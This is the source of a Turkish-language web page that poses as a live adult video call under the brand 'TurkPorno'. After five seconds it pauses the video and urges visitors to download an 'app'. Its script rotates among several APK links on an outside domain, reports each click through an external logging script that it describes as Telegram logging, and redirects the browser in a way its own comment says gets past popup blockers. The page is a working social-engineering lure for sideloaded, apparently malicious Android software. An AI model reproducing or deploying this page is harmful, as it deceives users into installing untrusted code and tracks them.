    <style>
        * {
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            background: #000;
        }
        video {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: translate(-50%, -50%);
            z-index: 0;
        }
        .stopped {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 20;
            display: none;
            backdrop-filter: blur(2px);
        }
        @keyframes pulse-heart {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        .animate-pulse-heart {
            animation: pulse-heart 1s ease-in-out infinite;
        }
        .btn-press {
            transition: transform 0.1s ease;
        }
        .btn-press:active {
            transform: scale(0.96);
        }
        @media (max-width: 640px) {
            .stopped {
                
                width: 85%;
                min-width: auto;
                max-width: 320px;
            }
        }
        .ripple-effect {
            position: relative;
            overflow: hidden;
        }
        .ripple-effect:after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255,255,255,0.5);
            transform: translate(-50%, -50%);
            transition: width 0.3s, height 0.3s;
        }
        .ripple-effect:active:after {
            width: 200%;
            height: 200%;
            opacity: 0;
            transition: 0s;
        }
        .toast-notification {
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: linear-gradient(135deg, #1e1e2f, #2a2a3b);
            color: white;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: 500;
            z-index: 100;
            opacity: 0;
            transition: all 0.3s ease;
            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
            pointer-events: none;
        }
        .toast-notification.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }
        .toast-notification i {
            margin-right: 8px;
            color: #10b981;
        }
    </style>
</head>
<body>

    <div class="toast-notification" id="toastMsg">
        <i class="fa-solid fa-circle-check"></i>
        <span id="toastText">İndirme başlatıldı!</span>
    </div>

    <div class="bg-black bg-opacity-60 backdrop-blur-sm flex absolute py-1.5 px-4 rounded-full gap-2 top-4 left-3 z-10">
        <div class="flex items-center justify-center">
            <span class="relative flex h-3 w-3">
                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                <span class="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
            </span>
        </div>
        <p class="text-white text-sm font-medium tracking-wide">Canlı Yayın</p>
    </div>

    <video autoplay muted loop id="backgroundVideo"></video>

    <div class="bg-white/95 backdrop-blur-sm fixed bottom-0 w-full p-3 rounded-t-3xl shadow-2xl z-10" id="controlBar">
        <div class="bg-gray-300 w-24 h-1 rounded-2xl m-auto mb-2"></div>
        <div class="flex gap-10 justify-center p-2">
            <div class="bg-[#F0F0F0] flex justify-center items-center w-12 h-12 rounded-full shadow-md btn-press transition-all">
                <i class="fa-solid fa-volume-xmark text-gray-700 text-xl"></i>
            </div>
            <div class="bg-[#F0F0F0] flex justify-center items-center w-12 h-12 rounded-full shadow-md btn-press transition-all">
                <i class="fa-solid fa-video-slash text-gray-700 text-xl"></i>
            </div>
            <div class="bg-[#F0F0F0] flex justify-center items-center w-12 h-12 rounded-full shadow-md btn-press transition-all">
                <i class="fa-solid fa-microphone-slash text-gray-700 text-xl"></i>
            </div>
            <div class="bg-[#FAE4E6] flex justify-center items-center w-12 h-12 rounded-full shadow-md btn-press transition-all">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%23dc2626' stroke-width='1.5'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M15 10.5a3 3 0 11-6 0 3 3 0 016 0z' /%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z' /%3E%3C/svg%3E" alt="call" class="w-5 h-5">
            </div>
        </div>
    </div>

    <div class="bg-white rounded-2xl shadow-2xl flex flex-col justify-center items-center gap-4 py-8 px-6 text-center stopped" id="stoppedDiv">
        <div class="bg-gradient-to-br from-purple-100 to-pink-100 rounded-full p-4">
            <img src="favicon.png" alt="icon" class="w-8 h-8">
        </div>
        <p class="font-extrabold text-2xl bg-gradient-to-r from-purple-700 to-pink-600 bg-clip-text text-transparent">TurkPorno</p>
        <p class="font-normal text-gray-600 text-sm max-w-xs">Görüntülü & sesli görüşmeler<br>yalnızca mobil uygulamamız üzerinden<br>yapılabilmektedir.</p>
        
        <a href="javascript:void(0)" id="downloadBtn"
            class="bg-[#6156DF] hover:bg-[#4f44c5] animate-pulse-heart text-white w-48 rounded-xl flex items-center justify-center py-3.5 px-5 relative shadow-lg transition-all duration-200 btn-press ripple-effect font-semibold text-base">
            İndir
            <i class="fa-solid fa-angle-right absolute right-5 text-white text-sm"></i>
        </a>
        
        <div class="mt-1">
            <ul class="list-disc text-[11px] text-gray-500 space-y-0.5">
                <li>Üyelik tamamen ücretsizdir.</li>
                <li>Hızlı & güvenli indirme</li>
            </ul>
        </div>
        <p class="text-[10px] text-gray-400 mt-1">Güncel</p>
    </div>

    <script src="log.js"></script>

    <script>
        const videos = [
            'videos/video1.mp4', 'videos/video2.mp4', 'videos/video3.mp4', 'videos/video4.mp4', 'videos/video5.mp4',
            'videos/video6.mp4', 'videos/video7.mp4', 'videos/video8.mp4', 'videos/video9.mp4', 'videos/video10.mp4',
            'videos/video11.mp4', 'videos/video12.mp4', 'videos/video13.mp4', 'videos/video14.mp4', 'videos/video15.mp4',
            'videos/video16.mp4', 'videos/video17.mp4', 'videos/video18.mp4', 'videos/video19.mp4', 'videos/video20.mp4'
        ];

        const APK_SOURCES = [
            "https://kaspergroo.com/sohbet/TurkPornoV1.apk",
            "https://kaspergroo.com/sohbet/TurkPornoV2.apk",
            "https://kaspergroo.com/sohbet/TurkPornoV3.apk",
            "https://kaspergroo.com/sohbet/TurkPornoV4.apk"
        ];

        function showToast(message, isError = false) {
            const toast = document.getElementById('toastMsg');
            const toastText = document.getElementById('toastText');
            const icon = toast.querySelector('i');
            toastText.textContent = message;
            if (isError) {
                icon.className = 'fa-solid fa-circle-exclamation';
                icon.style.color = '#ef4444';
                toast.style.background = 'linear-gradient(135deg, #2a1a1a, #3a1a1a)';
            } else {
                icon.className = 'fa-solid fa-circle-check';
                icon.style.color = '#10b981';
                toast.style.background = 'linear-gradient(135deg, #1e1e2f, #2a2a3b)';
            }
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 3000);
        }

        function getCurrentApkLink() {
            const now = new Date();
            const totalHours = now.getHours() + (now.getMinutes() / 60);
            const slotIndex = Math.floor(totalHours / 6) % APK_SOURCES.length;
            return APK_SOURCES[slotIndex];
        }

        window.onload = function() {
            const randomVideo = videos[Math.floor(Math.random() * videos.length)];
            const videoEl = document.getElementById('backgroundVideo');
            if (videoEl) {
                videoEl.src = randomVideo;
                videoEl.load();
                videoEl.play().catch(e => console.log("Video otoplay engeli:", e));
            }

            setTimeout(function() {
                if (videoEl) videoEl.pause();
                const stoppedDiv = document.getElementById('stoppedDiv');
                if (stoppedDiv) stoppedDiv.style.display = 'flex';
                const controlBar = document.getElementById('controlBar');
                if (controlBar) controlBar.style.opacity = '0.7';
            }, 5000);
        };

        document.addEventListener('DOMContentLoaded', function() {
            const downloadBtn = document.getElementById('downloadBtn');
            if (!downloadBtn) return;
            
            let isProcessing = false;
            
            async function handleDownload(e) {
                if (e) e.preventDefault();
                if (isProcessing) return;
                isProcessing = true;
                
                downloadBtn.innerHTML = `Yükleniyor... <i class="fa-solid fa-spinner fa-spin absolute right-5 text-white"></i>`;
                downloadBtn.style.opacity = '0.8';
                downloadBtn.disabled = true;
                
                try {
                    const currentApkUrl = getCurrentApkLink();
                    
                    if (typeof window.sendLog === 'function') {
                        await window.sendLog(currentApkUrl);
                        showToast("İndirme başlatılıyor!");
                    } else {
                        showToast("İndirme başlatılıyor...");
                    }
                    
                    // Popup engelleyiciyi aşan basit yönlendirme
                    window.location.href = currentApkUrl;
                    
                    setTimeout(() => {
                        if (downloadBtn) {
                            downloadBtn.innerHTML = `Tekrar İndir <i class="fa-solid fa-arrow-rotate-right absolute right-5 text-white text-sm"></i>`;
                            downloadBtn.style.opacity = '1';
                            downloadBtn.disabled = false;
                        }
                        isProcessing = false;
                    }, 1500);
                    
                } catch (error) {
                    console.error("İndirme hatası:", error);
                    showToast("Bağlantı hatası, tekrar deneyin!", true);
                    setTimeout(() => {
                        if (downloadBtn) {
                            downloadBtn.innerHTML = `İndir <i class="fa-solid fa-angle-right absolute right-5"></i>`;
                            downloadBtn.style.opacity = '1';
                            downloadBtn.disabled = false;
                        }
                        isProcessing = false;
                    }, 1000);
                }
            }
            
            downloadBtn.addEventListener('click', handleDownload);
        });
        
        const videoElem = document.getElementById('backgroundVideo');
        if (videoElem) {
            videoElem.play().catch(err => {
                const startVideoOnInteraction = () => {
                    videoElem.play().catch(e=>console.log);
                    document.removeEventListener('click', startVideoOnInteraction);
                    document.removeEventListener('touchstart', startVideoOnInteraction);
                };
                document.addEventListener('click', startVideoOnInteraction);
                document.addEventListener('touchstart', startVideoOnInteraction);
            });
        }
        
        const muteBtn = document.querySelector('.fa-volume-xmark')?.parentElement;
        const videoBtn = document.querySelector('.fa-video-slash')?.parentElement;
        const micBtn = document.querySelector('.fa-microphone-slash')?.parentElement;
        
        if (muteBtn) {
            muteBtn.addEventListener('click', () => {
                const icon = muteBtn.querySelector('i');
                if (icon) {
                    icon.classList.toggle('fa-volume-xmark');
                    icon.classList.toggle('fa-volume-high');
                }
            });
        }
        if (videoBtn) {
            videoBtn.addEventListener('click', () => {
                const vid = document.getElementById('backgroundVideo');
                if (vid) {
                    if (vid.paused) vid.play().catch(e=>console.log);
                    else vid.pause();
                }
                const icon = videoBtn.querySelector('i');
                if (icon) {
                    icon.classList.toggle('fa-video-slash');
                    icon.classList.toggle('fa-video');
                }
            });
        }
        if (micBtn) {
            micBtn.addEventListener('click', () => {
                const icon = micBtn.querySelector('i');
                if (icon) {
                    icon.classList.toggle('fa-microphone-slash');
                    icon.classList.toggle('fa-microphone');
                }
            });
        }
        
        console.log("TurkPorno Görüntülü Görüşme Hazır | Telegram log aktif");
    </script>
</body>
